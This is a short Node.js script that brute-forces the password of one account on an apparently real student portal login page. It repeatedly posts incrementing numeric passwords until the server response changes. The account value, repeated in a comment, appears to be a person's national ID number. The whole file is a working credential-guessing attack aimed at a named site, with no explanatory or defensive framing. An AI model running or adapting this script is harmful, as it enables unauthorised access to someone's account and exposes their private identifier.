//  440801199411252652
var request = require('request'); // 第三方模块
// console.log(request);
var password = 252352

function hack() {
    request.post({
        url: 'http://stu.1000phone.net/student.php/Public/login',
        form: {
            Account: '440801199411252652',
            PassWord: ++password
        }
    }, function (err, httpResponse, body) {
        if (body) {
            console.log("密码错误", password);
            hack()
        } else {
            console.log("密码正确", password);
            return;
        }
    })
}
hack()